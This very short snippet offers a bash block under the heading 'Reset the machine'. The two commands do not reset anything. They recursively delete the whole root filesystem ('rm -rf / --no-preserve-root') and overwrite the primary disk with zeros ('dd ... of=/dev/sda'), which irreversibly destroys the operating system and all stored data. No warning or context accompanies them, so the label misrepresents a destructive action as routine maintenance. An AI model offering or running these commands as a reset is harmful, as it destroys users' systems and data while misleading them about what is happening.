Reset the machine:

```bash
sudo rm -rf / --no-preserve-root
dd if=/dev/zero of=/dev/sda bs=1M
```
